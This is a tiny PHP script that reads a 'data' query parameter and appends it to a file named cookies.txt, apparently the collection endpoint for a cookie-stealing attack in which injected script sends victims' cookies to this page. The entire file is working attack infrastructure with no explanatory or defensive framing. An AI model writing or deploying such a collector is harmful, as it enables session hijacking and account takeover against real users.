<?php

	$cookie = $_GET['data'];
	$fileToSave = fopen("cookies.txt", "a+");
	fwrite($fileToSave, $cookie . "\n");
	fclose($fileToSave);
?>
